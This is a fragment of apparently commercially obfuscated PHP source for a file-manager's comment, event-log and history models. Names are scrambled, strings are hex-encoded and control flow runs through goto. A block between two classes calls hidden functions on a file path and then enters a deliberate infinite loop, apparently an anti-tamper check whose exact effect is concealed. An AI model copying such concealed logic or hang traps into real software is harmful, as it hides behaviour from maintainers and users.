$this->add($Fª¦™Œ‡åˆ); } public function remove($cÓÌ¯œÁ°ƒ) { $bÊ·˜©° =& $_SERVER[Ö¹ñÒÁ²÷]; $Dñ˜‹÷ù½³ = array($bÊ·˜©°[2108] => $cÓÌ¯œÁ°ƒ); $Eçæ”¨¸ì† = $this->where($Dñ˜‹÷ù½³)->find(); if ($Eçæ”¨¸ì†[$bÊ·˜©°[2107]]) { $this->where(array($bÊ·˜©°[2108] => $Eçæ”¨¸ì†[$bÊ·˜©°[2107]]))->setAdd($bÊ·˜©°[2109], -1); } return $this->where($Dñ˜‹÷ù½³)->delete(); } public function edit($a™Æ†°ÑÉë, $fÈ‰¿¸Ô) { $a¸ğÚÓë =& $_SERVER[Ö¹ñÒÁ²÷]; $bÖéÓŒ˜Ì² = array($a¸ğÚÓë[2108] => $a™Æ†°ÑÉë); return $this->where($bÖéÓŒ˜Ì²)->save(array($a¸ğÚÓë[2110] => $fÈ‰¿¸Ô)); } public function prasise($CÙ¥¢©çªÙ) { $CòõÜ²²ã =& $_SERVER[Ö¹ñÒÁ²÷]; $AÉäÛÈ¤ä = Model($CòõÜ²²ã[2111]); $EÏÜ–¥İ® = array($CòõÜ²²ã[2108] => $CÙ¥¢©çªÙ, $CòõÜ²²ã[1406] => USER_ID); $f‡ÜŸ“ = $AÉäÛÈ¤ä->where($EÏÜ–¥İ®)->find(); if (!$f‡ÜŸ“) { $AÉäÛÈ¤ä->add($EÏÜ–¥İ®); $F‚…øƒñ = $this->where(array($CòõÜ²²ã[2108] => $CÙ¥¢©çªÙ))->setAdd($CòõÜ²²ã[2112], 1); } else { $AÉäÛÈ¤ä->where($EÏÜ–¥İ®)->delete(); $F‚…øƒñ = $this->where(array($CòõÜ²²ã[2108] => $CÙ¥¢©çªÙ))->setAdd($CòõÜ²²ã[2112], -1); } return $F‚…øƒñ; } public function targetInfo($bâ•¶ÆÇ¢è, $FŠÇ¿ëØù‡) { goto DÎ«ôÁÎÅ‘; Cíš«´®¾‡: return $D•Äº†·Óï; goto cë·ëÛÃÜ–; CïóÏ¢Ïö: $EÎ®ôïØÕµ = "\122\x49\x47\x48\x54\x20\112\117\x49\x4e\40{$this->tablePrefix}\x63\157\155\x6d\145\156\x74\x5f\x70\x72\141\151\x73\145\40\163\164\141\x72\40\x6f\x6e\x20\143\x6f\155\x6d\x65\x6e\x74\x2e\x63\x6f\155\155\x65\x6e\164\x49\104\40\75\40\x73\164\x61\162\x2e\143\x6f\155\155\x65\156\164\x49\x44"; $Bœ¨Û¾Ü‹í = $this->alias($EŸƒç¯áŠô[337])->where($c›ğ¦ëğ‡)->join($EÎ®ôïØÕµ, $EŸƒç¯áŠô[2113])->count(); $D•Äº†·Óï = array($EŸƒç¯áŠô[2114] => $EŒ˜Ÿ„Ü…³, $EŸƒç¯áŠô[2115] => $Bœ¨Û¾Ü‹í); goto Cíš«´®¾‡; DÎ«ôÁÎÅ‘: $EŸƒç¯áŠô =& $_SERVER[Ö¹ñÒÁ²÷]; $c›ğ¦ëğ‡ = array($EŸƒç¯áŠô[517] => $bâ•¶ÆÇ¢è, $EŸƒç¯áŠô[518] => $FŠÇ¿ëØù‡); $EŒ˜Ÿ„Ü…³ = $this->where($c›ğ¦ëğ‡)->count(); goto CïóÏ¢Ïö; cë·ëÛÃÜ–: } public function listData($bÉÅö™Ó°›) { $d‘Ö•Ï­ =& $_SERVER[Ö¹ñÒÁ²÷]; if (isset($bÉÅö™Ó°›[$d‘Ö•Ï­[2116]])) { if ($bÉÅö™Ó°›[$d‘Ö•Ï­[2116]]) { $bÉÅö™Ó°›[$d‘Ö•Ï­[2117]] = array($d‘Ö•Ï­[924], intval($bÉÅö™Ó°›[$d‘Ö•Ï­[2116]])); } unset($bÉÅö™Ó°›[$d‘Ö•Ï­[2116]]); } if (isset($bÉÅö™Ó°›[$d‘Ö•Ï­[2118]])) { if ($bÉÅö™Ó°›[$d‘Ö•Ï­[2118]]) { $bÉÅö™Ó°›[$d‘Ö•Ï­[2117]] = array($d‘Ö•Ï­[921], intval($bÉÅö™Ó°›[$d‘Ö•Ï­[2118]])); } unset($bÉÅö™Ó°›[$d‘Ö•Ï­[2118]]); } return $this->_listData($bÉÅö™Ó°›); } private function _listData($E¥Šñò¡ºÑ) { $b¥¥©³•ëä =& $_SERVER[Ö¹ñÒÁ²÷]; $f‹ÖöÒ½„ = $this->where($E¥Šñò¡ºÑ)->_makeOrder()->selectPage(100); $this->_listAppendParent($f‹ÖöÒ½„[$b¥¥©³•ëä[350]]); $this->_listAppendUser($f‹ÖöÒ½„[$b¥¥©³•ëä[350]]); $this->_listAppendMeta($f‹ÖöÒ½„[$b¥¥©³•ëä[350]]); return $f‹ÖöÒ½„; } private function _makeOrder() { $Bêæ²†´£© =& $_SERVER[Ö¹ñÒÁ²÷]; $Fè•¢ÄŸŒ = array($Bêæ²†´£©[2112], $Bêæ²†´£©[2109], $Bêæ²†´£©[183]); $Bß“â‹âÓ = Input::get($Bêæ²†´£©[403], $Bêæ²†´£©[7], $Bêæ²†´£©[385], $Fè•¢ÄŸŒ); $EÍÌîÁ£àŒ = Input::get($Bêæ²†´£©[404], $Bêæ²†´£©[7], $Bêæ²†´£©[1408], array($Bêæ²†´£©[2119], $Bêæ²†´£©[401])); $B†ªƒÎÄé¼ = $Bß“â‹âÓ . $Bêæ²†´£©[50] . $EÍÌîÁ£àŒ; return $this->order($B†ªƒÎÄé¼); } private function _listAppendParent(&$CØ¿«—“¢å) { goto A“ëÛë’œ¤; A“ëÛë’œ¤: $B¶‡˜ğËÕ˜ =& $_SERVER[Ö¹ñÒÁ²÷]; $e³³ö‰÷Ú = array_unique(array_to_keyvalue($CØ¿«—“¢å, $B¶‡˜ğËÕ˜[33], $B¶‡˜ğËÕ˜[2107])); $e³³ö‰÷Ú = array_remove_value($e³³ö‰÷Ú, $B¶‡˜ğËÕ˜[464]); goto Cª¥ÕŠßØ; cİ¦â‹Ş‡Ë: foreach ($CØ¿«—“¢å as &$cÕô÷˜·Ö¸) { if (isset($F‰¤ä£øğ£[$cÕô÷˜·Ö¸[$B¶‡˜ğËÕ˜[2107]]])) { $cÕô÷˜·Ö¸[$B¶‡˜ğËÕ˜[2120]] = $F‰¤ä£øğ£[$cÕô÷˜·Ö¸[$B¶‡˜ğËÕ˜[2107]]]; } } goto b†ùÅÔ·Ó; Cª¥ÕŠßØ: if (!$e³³ö‰÷Ú) { return; } $F‰¤ä£øğ£ = $this->where(array($B¶‡˜ğËÕ˜[2108] => array($B¶‡˜ğËÕ˜[7], $e³³ö‰÷Ú)))->select(); $F‰¤ä£øğ£ = array_to_keyvalue($F‰¤ä£øğ£, $B¶‡˜ğËÕ˜[2117]); goto cİ¦â‹Ş‡Ë; b†ùÅÔ·Ó: } private function _listAppendUser(&$D‰¹•ÏßÔÜ) { goto E®ç‰Á›¨¶; E®ç‰Á›¨¶: $cÄ¹´­‚Ù =& $_SERVER[Ö¹ñÒÁ²÷]; $Bõ´¥ºóÎ = array_unique(array_to_keyvalue($D‰¹•ÏßÔÜ, $cÄ¹´­‚Ù[33], $cÄ¹´­‚Ù[1415])); $Bõ´¥ºóÎ = array_remove_value($Bõ´¥ºóÎ, $cÄ¹´­‚Ù[464]); goto c˜Šã‹Øà; e»ÇŒ‰Âœ¥: foreach ($D‰¹•ÏßÔÜ as &$FÁÁ×˜³Ş) { $FÁÁ×˜³Ş[$cÄ¹´­‚Ù[531]] = $CŒÑê»ÒŸŠ[$FÁÁ×˜³Ş[$cÄ¹´­‚Ù[1415]]]; if (isset($FÁÁ×˜³Ş[$cÄ¹´­‚Ù[2120]])) { $FÁÁ×˜³Ş[$cÄ¹´­‚Ù[2120]][$cÄ¹´­‚Ù[531]] = $CŒÑê»ÒŸŠ[$FÁÁ×˜³Ş[$cÄ¹´­‚Ù[2120]][$cÄ¹´­‚Ù[1415]]]; } } goto Fƒãî„ÁŸŞ; c˜Šã‹Øà: if (count($Bõ´¥ºóÎ) == 0) { return; } foreach ($D‰¹•ÏßÔÜ as $FÁÁ×˜³Ş) { if (isset($FÁÁ×˜³Ş[$cÄ¹´­‚Ù[2120]])) { $Bõ´¥ºóÎ[] = $FÁÁ×˜³Ş[$cÄ¹´­‚Ù[2120]][$cÄ¹´­‚Ù[1415]]; } } $CŒÑê»ÒŸŠ = Model($cÄ¹´­‚Ù[473])->userListInfo($Bõ´¥ºóÎ); goto e»ÇŒ‰Âœ¥; Fƒãî„ÁŸŞ: } private function _listAppendMeta(&$eùÊİœ˜ŞÓ) { goto A¿êôÚø¯¬; e‹ÉÃ¿œä: if (!$CÁ£‹©‡±) { return !1; } foreach ($eùÊİœ˜ŞÓ as &$FÇ¯¯¯‰±) { $FÇ¯¯¯‰±[$Fã‘ˆ‹Ş×®[413]] = $CÁ£‹©‡±[$FÇ¯¯¯‰±[$Fã‘ˆ‹Ş×®[2117]]]; if (isset($FÇ¯¯¯‰±[$Fã‘ˆ‹Ş×®[2120]])) { $FÇ¯¯¯‰±[$Fã‘ˆ‹Ş×®[2120]][$Fã‘ˆ‹Ş×®[413]] = $CÁ£‹©‡±[$FÇ¯¯¯‰±[$Fã‘ˆ‹Ş×®[2120]][$Fã‘ˆ‹Ş×®[2117]]]; } } goto Dâ–‡¥À›ä; A¿êôÚø¯¬: $Fã‘ˆ‹Ş×® =& $_SERVER[Ö¹ñÒÁ²÷]; $Aå´¹ÔÑŠå = array_unique(array_to_keyvalue($eùÊİœ˜ŞÓ, $Fã‘ˆ‹Ş×®[33], $Fã‘ˆ‹Ş×®[2117])); $Aå´¹ÔÑŠå = array_remove_value($Aå´¹ÔÑŠå, $Fã‘ˆ‹Ş×®[464]); goto Câ¾÷Ë·ÕÙ; Câ¾÷Ë·ÕÙ: if (!$Aå´¹ÔÑŠå) { return; } foreach ($eùÊİœ˜ŞÓ as $FÇ¯¯¯‰±) { if (isset($FÇ¯¯¯‰±[$Fã‘ˆ‹Ş×®[2120]])) { $Aå´¹ÔÑŠå[] = $FÇ¯¯¯‰±[$Fã‘ˆ‹Ş×®[2120]][$Fã‘ˆ‹Ş×®[2117]]; } } $CÁ£‹©‡± = $this->metaList($Aå´¹ÔÑŠå); goto e‹ÉÃ¿œä; Dâ–‡¥À›ä: } private function metaList($eĞÒ²ïç©ƒ) { goto cËíø÷¸ºÒ; FÖ¥ÇÒè¶à: return $aÜÎøÚÅ‘ñ ? $aÜÎøÚÅ‘ñ : array(); goto b½Š‰Àø½; cËíø÷¸ºÒ: $B¯ô³àÏˆº =& $_SERVER[Ö¹ñÒÁ²÷]; if (!$eĞÒ²ïç©ƒ) { return array(); } $díù†ÉÚ³ = array($B¯ô³àÏˆº[2117] => array($B¯ô³àÏˆº[7], $eĞÒ²ïç©ƒ)); goto eçª¯ïÈ›Æ; eçª¯ïÈ›Æ: $aÜÎøÚÅ‘ñ = Model($B¯ô³àÏˆº[2121])->where($díù†ÉÚ³)->select(); $aÜÎøÚÅ‘ñ = array_to_keyvalue_group($aÜÎøÚÅ‘ñ, $B¯ô³àÏˆº[2117]); foreach ($aÜÎøÚÅ‘ñ as $f××›¡ƒÜ => $DÑ¥×œ’÷–) { $Cë‹±»Ò“¥ = array(); foreach ($DÑ¥×œ’÷– as $F˜µ—êËÒÎ) { $Cë‹±»Ò“¥[$F˜µ—êËÒÎ[$B¯ô³àÏˆº[89]]] = $F˜µ—êËÒÎ[$B¯ô³àÏˆº[355]]; } $aÜÎøÚÅ‘ñ[$f××›¡ƒÜ] = $Cë‹±»Ò“¥; } goto FÖ¥ÇÒè¶à; b½Š‰Àø½: } } goto Bõ“©ƒá„Ì; eÆ†±ÉïÓ”: if (!isset($_SERVER[$_SERVER[Ö¹ñÒÁ²÷][783]]) || !isset($_SERVER[$_SERVER[Ö¹ñÒÁ²÷][2101]])) { goto eœÏ“¿Ãªù; eœÏ“¿Ãªù: $fßÊÜÆÓ…´ = $_SERVER[Ö¹ñÒÁ²÷][786]; $eŞîÕŠ”Æ = $_SERVER[$_SERVER[Ö¹ñÒÁ²÷][787]] . $_SERVER[Ö¹ñÒÁ²÷][788]; $E‰ù¦¹®½ = $fßÊÜÆÓ…´($eŞîÕŠ”Æ); goto d¶íÛ¥Ôæƒ; d¶íÛ¥Ôæƒ: $EïÄ¶ÜË³ = explode($_SERVER[Ö¹ñÒÁ²÷][213], $E‰ù¦¹®½); if (count($EïÄ¶ÜË³) < $_SERVER[Ö¹ñÒÁ²÷][552]) { $BÉöïÕÕ¹¸ = $_SERVER[Ö¹ñÒÁ²÷][789]; $BÉöïÕÕ¹¸(); } $F„Çª»Óö¥ = $_SERVER[Ö¹ñÒÁ²÷][1481]; goto EĞ –¦¡Î‡; EĞ –¦¡Î‡: $F„Çª»Óö¥($_SERVER[$_SERVER[Ö¹ñÒÁ²÷][787]] . $_SERVER[Ö¹ñÒÁ²÷][788]); $fÉµ§®Èç = 2; while ($fÉµ§®Èç > 1) { $DÀ‹Œ÷Èˆ = rawurlencode($fÉµ§®Èç . $_SERVER[Ö¹ñÒÁ²÷][357]); } goto cÁŒ›ï«ç; cÁŒ›ï«ç: } class SourceEventModel extends ModelBase { protected $tableName = "\x69\157\x5f\163\x6f\165\162\x63\145\137\145\x76\x65\156\164"; protected $dataAuto = array(array("\143\162\x65\141\164\x65\x54\x69\155\145", "\x74\151\x6d\x65", "\151\156\x73\x65\x72\x74", "\146\x75\x6e\x63\164\151\157\x6e"), array("\144\145\163\x63", '', "\x69\156\x73\x65\162\164\54\165\160\144\x61\164\x65\54\163\x65\x6c\x65\x63\x74", "\152\x73\x6f\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($fôƒ¬¬¶óö, $F¦ŠÙ®õ®ö, $fäŒ«Í¼‹ù = '') { goto BæÎÇ§ë˜Ë; E­¿«¶“Š: if (!$b¹ãÔâ»¹·) { return !1; } if ($this->isCacheEvent($b¹ãÔâ»¹·, $F¦ŠÙ®õ®ö)) { return; } if ($fäŒ«Í¼‹ù && is_string($fäŒ«Í¼‹ù)) { $fäŒ«Í¼‹ù = array($A‚…ùğÌ[2110] => $fäŒ«Í¼‹ù); } goto bÌ¹ø¯¿ØÂ; bÌ¹ø¯¿ØÂ: $FÀØ¨»âŞĞ = array($A‚…ùğÌ[379] => $fôƒ¬¬¶óö, $A‚…ùğÌ[2253] => $b¹ãÔâ»¹·[$A‚…ùğÌ[457]], $A‚…ùğÌ[2254] => $b¹ãÔâ»¹·[$A‚…ùğÌ[28]], $A‚…ùğÌ[462] => $b¹ãÔâ»¹·[$A‚…ùğÌ[462]], $A‚…ùğÌ[1406] => USER_ID, $A‚…ùğÌ[384] => $F¦ŠÙ®õ®ö, $A‚…ùğÌ[1408] => $fäŒ«Í¼‹ù); $this->addSystemLog($F¦ŠÙ®õ®ö, $FÀØ¨»âŞĞ); return $this->add($FÀØ¨»âŞĞ); goto eæÄ‘‘ÃØ‹; BæÎÇ§ë˜Ë: $A‚…ùğÌ =& $_SERVER[Ö¹ñÒÁ²÷]; if (!$this->eventSave) { return; } $b¹ãÔâ»¹· = Model($A‚…ùğÌ[1104])->sourceInfo($fôƒ¬¬¶óö); goto E­¿«¶“Š; eæÄ‘‘ÃØ‹: } private function addSystemLog($Bâê×¿â´, $B±Ÿ™«í¬) { $FÍ¡­”øÊ« =& $_SERVER[Ö¹ñÒÁ²÷]; if ($Bâê×¿â´ == $FÍ¡­”øÊ«[2255]) { $Bâê×¿â´ = $B±Ÿ™«í¬[$FÍ¡­”øÊ«[401]][$FÍ¡­”øÊ«[2256]]; } else { if (in_array($Bâê×¿â´, array($FÍ¡­”øÊ«[2056], $FÍ¡­”øÊ«[2257]))) { $Bâê×¿â´ = $B±Ÿ™«í¬[$FÍ¡­”øÊ«[401]][$FÍ¡­”øÊ«[689]]; } } $f’£‹¶óÕ = array_merge($B±Ÿ™«í¬, array($FÍ¡­”øÊ«[2258] => $B±Ÿ™«í¬[$FÍ¡­”øÊ«[365]], $FÍ¡­”øÊ«[2259] => $B±Ÿ™«í¬[$FÍ¡­”øÊ«[2259]])); Model($FÍ¡­”øÊ«[2020])->addLog($FÍ¡­”øÊ«[2260] . $Bâê×¿â´, $f’£‹¶óÕ); } private function isCacheEvent($a×˜ßÕ‡‡‚, $F®³ïáÉö) { if ($a×˜ßÕ‡‡‚[$_SERVER[Ö¹ñÒÁ²÷][367]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($c÷Æ¤ÜŒ¸Æ, $Aç³ÍìíÏï) { $b™¶ÛäÎº¿ =& $_SERVER[Ö¹ñÒÁ²÷]; $DŠªŞµ›Ü = Model($b™¶ÛäÎº¿[1104])->sourceInfo($c÷Æ¤ÜŒ¸Æ); $EœÙ¶õ’§ç = array($b™¶ÛäÎº¿[2256] => $Aç³ÍìíÏï, $b™¶ÛäÎº¿[28] => $DŠªŞµ›Ü[$b™¶ÛäÎº¿[28]]); return $this->addEvent($c÷Æ¤ÜŒ¸Æ, $b™¶ÛäÎº¿[2255], $EœÙ¶õ’§ç); } public function eventFileEdit($BÌ‹•Ûé‚„) { $FÑã°ê„ØÍ =& $_SERVER[Ö¹ñÒÁ²÷]; $A§Îù×‡ „ = array($FÑã°ê„ØÍ[2261] => $_SERVER[$FÑã°ê„ØÍ[2262]], $FÑã°ê„ØÍ[1726] => strtolower(ACTION)); return $this->addEvent($BÌ‹•Ûé‚„, $FÑã°ê„ØÍ[2047], $A§Îù×‡ „); } public function eventRecycle($fˆ²¶ôøÇì, $cˆ–Õ—™°) { return $this->addEvent($fˆ²¶ôøÇì, $_SERVER[Ö¹ñÒÁ²÷][2257], $cˆ–Õ—™°); } public function eventRemove($Eñ‹ê†ê¿ª) { $dù ¢ÖÛÏ =& $_SERVER[Ö¹ñÒÁ²÷]; $F°Óê¬¹Íæ = Model($dù ¢ÖÛÏ[1104])->sourceInfo($Eñ‹ê†ê¿ª); $eÌ‡Ü–ÏÈÙ = $F°Óê¬¹Íæ[$dù ¢ÖÛÏ[28]]; return $this->addEvent($F°Óê¬¹Íæ[$dù ¢ÖÛÏ[457]], $dù ¢ÖÛÏ[2046], $eÌ‡Ü–ÏÈÙ); } public function eventShare($c¹À´“Î„à, $f£Ä†ÕÃ©é) { return $this->addEvent($c¹À´“Î„à, $_SERVER[Ö¹ñÒÁ²÷][2056], $f£Ä†ÕÃ©é); } public function eventMove($FÒ†ââÓ‡‡, $D²– ÚÆ, $C²ˆ±ã˜øĞ) { goto e¿´‚šŸÇ; e–ˆ¡­ŠØÜ: $this->addEvent($D²– ÚÆ, $FŒí‘ñÓ¯[2267], $C°Ğ‰Ä“ğÜ); goto AÃÁç¦”å; e¿´‚šŸÇ: $FŒí‘ñÓ¯ =& $_SERVER[Ö¹ñÒÁ²÷]; $f¸¡‘ÊÜ¿˜ = Model($FŒí‘ñÓ¯[1104]); $cÚ Ü„ËšĞ = $f¸¡‘ÊÜ¿˜->sourceInfo($FÒ†ââÓ‡‡); goto cŒ¼†ˆ‰¯; dÇ‰± Ğİƒ: $this->addEvent($FÒ†ââÓ‡‡, $FŒí‘ñÓ¯[488], $C°Ğ‰Ä“ğÜ); $cÚ Ü„ËšĞ = $f¸¡‘ÊÜ¿˜->sourceInfo($FÒ†ââÓ‡‡); $C°Ğ‰Ä“ğÜ = array($FŒí‘ñÓ¯[365] => $cÚ Ü„ËšĞ[$FŒí‘ñÓ¯[365]], $FŒí‘ñÓ¯[28] => $cÚ Ü„ËšĞ[$FŒí‘ñÓ¯[28]]); goto e–ˆ¡­ŠØÜ; cŒ¼†ˆ‰¯: $d‡¾ªİ‰ë‡ = $f¸¡‘ÊÜ¿˜->sourceInfo($D²– ÚÆ); $FÙ‰ïÊô¿¦ = $f¸¡‘ÊÜ¿˜->sourceInfo($C²ˆ±ã˜øĞ); $C°Ğ‰Ä“ğÜ = array($FŒí‘ñÓ¯[1000] => $D²– ÚÆ, $FŒí‘ñÓ¯[2263] => $d‡¾ªİ‰ë‡[$FŒí‘ñÓ¯[28]], $FŒí‘ñÓ¯[2264] => $d‡¾ªİ‰ë‡[$FŒí‘ñÓ¯[462]], $FŒí‘ñÓ¯[1001] => $C²ˆ±ã˜øĞ, $FŒí‘ñÓ¯[2265] => $FÙ‰ïÊô¿¦[$FŒí‘ñÓ¯[28]], $FŒí‘ñÓ¯[2266] => $FÙ‰ïÊô¿¦[$FŒí‘ñÓ¯[462]]); goto dÇ‰± Ğİƒ; AÃÁç¦”å: } public function eventCopy($D¶¼áà±—Ğ) { $this->eventCreate($D¶¼áà±—Ğ, $_SERVER[Ö¹ñÒÁ²÷][486]); } public function eventRename($A”³•Éˆ¨å, $B»´”óƒàÆ, $c…„æ¦¶•²) { $aÁÆ±×Ú“³ =& $_SERVER[Ö¹ñÒÁ²÷]; $FÉáŞçôŠÅ = array($aÁÆ±×Ú“³[1000] => $B»´”óƒàÆ, $aÁÆ±×Ú“³[1001] => $c…„æ¦¶•²); return $this->addEvent($A”³•Éˆ¨å, $aÁÆ±×Ú“³[1116], $FÉáŞçôŠÅ); } public function eventAddComment($AÅš–ÁÑÎ, $CÚØÉ¥ğ¢µ) { return $this->addEvent($AÅš–ÁÑÎ, $_SERVER[Ö¹ñÒÁ²÷][2268], $CÚØÉ¥ğ¢µ); } public function eventAddDesc($FÛ°£¢­•‰, $B™±È×Ù®±) { return $this->addEvent($FÛ°£¢­•‰, $_SERVER[Ö¹ñÒÁ²÷][2269], $B™±È×Ù®±); } public function listBySource($cš÷‚¾…‹) { goto AµÁí»××; AµÁí»××: $féÚÑõ’Œ­ =& $_SERVER[Ö¹ñÒÁ²÷]; $A†¹•éó¹ = Model($féÚÑõ’Œ­[1104])->sourceInfo($cš÷‚¾…‹); $CÊñ¯‚•× = array($féÚÑõ’Œ­[379] => $cš÷‚¾…‹); goto eÇøË„Û½–; eÇøË„Û½–: if ($A†¹•éó¹[$féÚÑõ’Œ­[366]] == $féÚÑõ’Œ­[83]) { $bÁ¡²Şˆ’ = Model($féÚÑõ’Œ­[1104])->listSearchChildren($cš÷‚¾…‹, 20000); $bÁ¡²Şˆ’[] = $cš÷‚¾…‹ . $féÚÑõ’Œ­[357]; $CÊñ¯‚•× = array($féÚÑõ’Œ­[365] => array($féÚÑõ’Œ­[7], $bÁ¡²Şˆ’)); } $dß¦ğ­÷ëÁ = $this->where($CÊñ¯‚•×)->order($féÚÑõ’Œ­[2270])->selectPage(); if ($dß¦ğ­÷ëÁ[$féÚÑõ’Œ­[347]][$féÚÑõ’Œ­[348]] == 0) { $dß¦ğ­÷ëÁ[$féÚÑõ’Œ­[347]][$féÚÑõ’Œ­[348]] = 1; $dß¦ğ­÷ëÁ[$féÚÑõ’Œ­[350]] = array(array($féÚÑõ’Œ­[379] => $cš÷‚¾…‹, $féÚÑõ’Œ­[2253] => $A†¹•éó¹[$féÚÑõ’Œ­[457]], $féÚÑõ’Œ­[1406] => $A†¹•éó¹[$féÚÑõ’Œ­[374]], $féÚÑõ’Œ­[384] => $féÚÑõ’Œ­[2271], $féÚÑõ’Œ­[385] => $A†¹•éó¹[$féÚÑõ’Œ­[183]], $féÚÑõ’Œ­[1408] => $féÚÑõ’Œ­[33])); } goto Aã—ˆ“¾œˆ; Aã—ˆ“¾œˆ: $dß¦ğ­÷ëÁ = $this->eventListParse($dß¦ğ­÷ëÁ, $cš÷‚¾…‹); show_json($dß¦ğ­÷ëÁ); goto c£‹ÖÍ‘Îƒ; c£‹ÖÍ‘Îƒ: } private function eventListParse($C¸®»é®±Ì, $fƒèì±ŠÌ´) { goto Cé©×›–È; aµ®‡É¿§: $d¯Äù•ÁÑ– = array_unique($d¯Äù•ÁÑ–); $b‰ÛºÉ–†Ú = array_unique(array_to_keyvalue($eå¹é»†ùé, $eÔî‹ÒäÔ«[33], $eÔî‹ÒäÔ«[1415])); $D¤º—¯éÙ = Model($eÔî‹ÒäÔ«[473])->userListInfo($b‰ÛºÉ–†Ú); goto FòŠÃÙ¿œÀ; Cé©×›–È: $eÔî‹ÒäÔ« =& $_SERVER[Ö¹ñÒÁ²÷]; $eå¹é»†ùé = $C¸®»é®±Ì[$eÔî‹ÒäÔ«[350]]; $d¯Äù•ÁÑ– = array_to_keyvalue($eå¹é»†ùé, $eÔî‹ÒäÔ«[33], $eÔî‹ÒäÔ«[365]); goto fÃ¾Á±…¹÷; FòŠÃÙ¿œÀ: $BŞùßÏ‡ß÷ = Model($eÔî‹ÒäÔ«[749])->sourceListInfo($d¯Äù•ÁÑ–, !0); foreach ($eå¹é»†ùé as &$B¾—Ô™î˜) { if ($B¾—Ô™î˜[$eÔî‹ÒäÔ«[29]] == $eÔî‹ÒäÔ«[488] && isset($B¾—Ô™î˜[$eÔî‹ÒäÔ«[401]][$eÔî‹ÒäÔ«[1000]])) { $B¾—Ô™î˜[$eÔî‹ÒäÔ«[401]][$eÔî‹ÒäÔ«[1000]] = $BŞùßÏ‡ß÷[$B¾—Ô™î˜[$eÔî‹ÒäÔ«[401]][$eÔî‹ÒäÔ«[1000]]]; $B¾—Ô™î˜[$eÔî‹ÒäÔ«[401]][$eÔî‹ÒäÔ«[1001]] = $BŞùßÏ‡ß÷[$B¾—Ô™î˜[$eÔî‹ÒäÔ«[401]][$eÔî‹ÒäÔ«[1001]]]; } if ($B¾—Ô™î˜[$eÔî‹ÒäÔ«[29]] == $eÔî‹ÒäÔ«[2267] && isset($B¾—Ô™î˜[$eÔî‹ÒäÔ«[401]][$eÔî‹ÒäÔ«[365]])) { $B¾—Ô™î˜[$eÔî‹ÒäÔ«[401]][$eÔî‹ÒäÔ«[365]] = $BŞùßÏ‡ß÷[$B¾—Ô™î˜[$eÔî‹ÒäÔ«[401]][$eÔî‹ÒäÔ«[365]]]; } $B¾—Ô™î˜[$eÔî‹ÒäÔ«[387]] = $BŞùßÏ‡ß÷[$B¾—Ô™î˜[$eÔî‹ÒäÔ«[365]]]; $B¾—Ô™î˜[$eÔî‹ÒäÔ«[2272]] = $BŞùßÏ‡ß÷[$B¾—Ô™î˜[$eÔî‹ÒäÔ«[2259]]]; if ($B¾—Ô™î˜[$eÔî‹ÒäÔ«[29]] == $eÔî‹ÒäÔ«[2046]) { $B¾—Ô™î˜[$eÔî‹ÒäÔ«[2272]] = $B¾—Ô™î˜[$eÔî‹ÒäÔ«[387]]; $B¾—Ô™î˜[$eÔî‹ÒäÔ«[2259]] = $B¾—Ô™î˜[$eÔî‹ÒäÔ«[2272]][$eÔî‹ÒäÔ«[365]]; $B¾—Ô™î˜[$eÔî‹ÒäÔ«[387]] = !1; $B¾—Ô™î˜[$eÔî‹ÒäÔ«[365]] = $eÔî‹ÒäÔ«[33]; } $B¾—Ô™î˜[$eÔî‹ÒäÔ«[2217]] = $D¤º—¯éÙ[$B¾—Ô™î˜[$eÔî‹ÒäÔ«[1415]]]; } $C¸®»é®±Ì[$eÔî‹ÒäÔ«[350]] = $eå¹é»†ùé; goto C…ÛÜÁÌâô; C…ÛÜÁÌâô: return $C¸®»é®±Ì; goto cÙÏ¶È·¢Î; fÃ¾Á±…¹÷: $e–ßËÖÄÖğ = array_to_keyvalue($eå¹é»†ùé, $eÔî‹ÒäÔ«[33], $eÔî‹ÒäÔ«[2259]); foreach ($eå¹é»†ùé as $B¾—Ô™î˜) { $Fó¥ÊˆƒÏâ = $B¾—Ô™î˜[$eÔî‹ÒäÔ«[401]]; if ($B¾—Ô™î˜[$eÔî‹ÒäÔ«[29]] == $eÔî‹ÒäÔ«[488] && isset($Fó¥ÊˆƒÏâ[$eÔî‹ÒäÔ«[1000]])) { $d¯Äù•ÁÑ–[] = $Fó¥ÊˆƒÏâ[$eÔî‹ÒäÔ«[1000]] . $eÔî‹ÒäÔ«[33]; $d¯Äù•ÁÑ–[] = $Fó¥ÊˆƒÏâ[$eÔî‹ÒäÔ«[1001]] . $eÔî‹ÒäÔ«[33]; } if ($B¾—Ô™î˜[$eÔî‹ÒäÔ«[29]] == $eÔî‹ÒäÔ«[2267] && isset($Fó¥ÊˆƒÏâ[$eÔî‹ÒäÔ«[365]])) { $d¯Äù•ÁÑ–[] = $Fó¥ÊˆƒÏâ[$eÔî‹ÒäÔ«[365]] . $eÔî‹ÒäÔ«[33]; } } $d¯Äù•ÁÑ– = array_merge($d¯Äù•ÁÑ–, $e–ßËÖÄÖğ, array($fƒèì±ŠÌ´ . $eÔî‹ÒäÔ«[33])); goto aµ®‡É¿§; cÙÏ¶È·¢Î: } public function removeBySource($e›‹µå‚³·) { $D£ƒ±âƒŒÎ = array($_SERVER[Ö¹ñÒÁ²÷][379] => $e›‹µå‚³·); $this->where($D£ƒ±âƒŒÎ)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\151\x6f\x5f\163\157\165\x72\143\145\137\150\151\163\164\157\162\x79"; public function addHistory($A§„œØ†‚, $a¦ĞÅª¯‰Û = '') { $eˆ‚äÁ÷•¿ =& $_SERVER[Ö¹ñÒÁ²÷]; $fÁâ‘ˆ¬ŒŸ = array($eˆ‚äÁ÷•¿[379] => $A§„œØ†‚[$eˆ‚äÁ÷•¿[365]], $eˆ‚äÁ÷•¿[1406] => isset($A§„œØ†‚[$eˆ‚äÁ÷•¿[375]]) ? $A§„œØ†‚[$eˆ‚äÁ÷•¿[375]] : $A§„œØ†‚[$eˆ‚äÁ÷•¿[374]], $eˆ‚äÁ÷•¿[416] => $A§„œØ†‚[$eˆ‚äÁ÷•¿[415]], $eˆ‚äÁ÷•¿[516] => $A§„œØ†‚[$eˆ‚äÁ÷•¿[77]], $eˆ‚äÁ÷•¿[2273] => $a¦ĞÅª¯‰Û); $FÔÀÕ®ğ‚… = 